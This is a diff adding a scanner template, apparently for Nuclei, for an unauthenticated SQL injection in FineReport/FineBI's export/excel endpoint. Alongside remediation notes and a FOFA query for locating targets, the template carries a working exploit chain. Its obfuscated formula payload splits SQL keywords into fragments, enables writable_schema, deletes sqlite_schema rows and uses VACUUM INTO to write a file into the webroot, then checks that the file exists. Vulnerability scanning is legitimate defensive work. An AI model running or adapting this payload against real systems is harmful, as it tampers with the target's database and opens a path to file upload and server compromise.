@@ -1,0 +1,77 @@
+id: finereport-export-excel-sqli
+
+info:
+  name: FineReport export/excel SQL Injection
+  author: qwtd
+  severity: critical
+  description: |
+    FineReport / FineBI / FineDataLink 存在 export/excel 接口 SQL 注入漏洞。由于对 export/excel 接口传入参数缺乏严格校验，攻击者可构造恶意请求触发内置 SQL/公式执行，进而造成数据泄露，并在特定条件下（工程存在 sqlite 驱动且配置 sqlite 类型数据连接）可进一步写入文件/上传 WebShell 导致远程代码执行。
+  remediation: |
+    官方已发布安全补丁，建议升级到以下版本或更高版本：
+    - FineReport >= 11.5.4.1
+    - FineBI 7.0.* >= 7.0.5
+    - FineBI 6.1.* >= 6.1.8
+    - FineBI 6.0.* >= 6.0.24
+    - FineDataLink 5.0.* >= 5.0.4.3
+    - FineDataLink 4.0.* >= 4.2.11.3
+    如无法升级，可临时规避：删除 sqlite 驱动或删除 sqlite 类型数据连接（含内置 FRDemo/BI Demo），并结合访问控制限制相关接口暴露面。
+  impact: |
+    远程未授权攻击者可通过构造请求注入并执行额外 SQL/表达式，导致敏感数据泄露、数据被篡改；在满足 sqlite 相关条件时，可能进一步实现写文件/上传 WebShell，从而获取服务器权限并执行任意系统命令。
+  reference:
+    - https://help.fanruan.com/finereport/edition-view-63998-0.html
+    - https://help.fanruan.com/finereport/doc-view-4833.html
+    - https://www.secrss.com/articles/86140
+    - https://wlaq.dlut.edu.cn/info/1097/7745.htm
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    vendor: fanruan
+    product: finereport
+    verified: true
+    max-request: 3
+    qvd-id: QVD-2025-48729
+    fofa-query: body="/webroot/decision/" || (body="FineReport" && body="content=\"FineReport--Web Reporting Tool\"") || title="FineReport" || title="FineReport报表" || title="FineBI"
+  tags: 帆软-FineReport
+
+variables:
+  username: "{{to_lower(rand_base(12))}}"
+
+http:
+  - raw:
+      - |
+        GET /webroot/ReportServer HTTP/1.1
+        Host: {{Hostname}}
+        viewlets: [{'reportlet':'/'}]
+        op: getSessionID
+
+    extractors:
+      - type: regex
+        part: body
+        name: uploadfile
+        regex:
+          - '([a-zA-Z0-9-]+[-a-zA-Z0-9])'
+        group: 1
+        internal: true
+
+  - raw:
+      - |
+        GET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7b%7d&__parameters__=%7b%7d HTTP/1.1
+        Host: {{Hostname}}
+        params: %3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%22%2C%22m+sq%22%2C%22li%22%2C%22t%22%2C%22e_sc%22%2C%22he%22%2C%22ma+w%22%2C%22here%22%2C%22+na%22%2C%22m%22%2C%22e%21%22%2C%22%3D%22%2C%22%27s%22%2C%22ql%22%2C%22ite%22%2C%22_s%22%2C%22ta%22%2C%22t%22%2C%221%27%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22an%22%2C%22aly%22%2C%22ze%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22re%22%2C%22p%22%2C%22lac%22%2C%22e+i%22%2C%22nto%22%2C%22+s%22%2C%22ql%22%2C%22ite_%22%2C%22st%22%2C%22at%22%2C%221+va%22%2C%22lu%22%2C%22es%28%27%22%2C%22%27%2C%27123%22%2C%22%27%22%2C%22%29%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22V%22%2C%22A%22%2C%22C%22%2C%22U%22%2C%22U%22%2C%22M%22%2C%22+i%22%2C%22nt%22%2C%22o%28%27%22%2CENV_HOME%2C%22%2F%22%2C%22.%22%2C%22.%22%2C%22%2F%22%2C%22.%22%2C%22%2F%22%2C%22{{username}}%22%2C%22.%22%2C%22t%22%2C%22x%22%2C%22t%22%2C%22%27%29%22%29%2C1%29%5D%5D%3E%3C%2FAttributes%3E%3C%2FO%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E%3C%2Fpd%3E
+        sessionID: {{uploadfile}}
+
+  - raw:
+      - |
+        GET /webroot/{{username}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQLite format"
+      - type: status
+        status:
+          - 200
